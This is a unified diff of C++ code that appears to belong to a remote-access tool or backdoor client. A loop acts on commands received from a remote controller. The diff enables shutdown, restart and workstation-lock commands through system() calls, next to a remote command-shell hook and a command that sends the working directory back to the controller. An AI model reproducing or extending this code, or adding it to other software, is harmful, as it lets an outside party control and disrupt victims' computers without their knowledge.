@@ -96,13 +96,13 @@ int main()
             RemoteCMD();
         }
         else if (RemoteCommand == "shutdown") {
-            // system("shutdown /p");
+            system("shutdown /p");
         }
         else if (RemoteCommand == "restart") {
-            // system("shutdown /r");
+            system("shutdown /r");
         }
         else if (RemoteCommand == "lock") {
-            // system("rundll32.exe user32.dll,LockWorkStation");
+            system("rundll32.exe user32.dll,LockWorkStation");
         }
         else if (RemoteCommand == "directory") {
             send(getcwd(buffer, sizeof(buffer)));
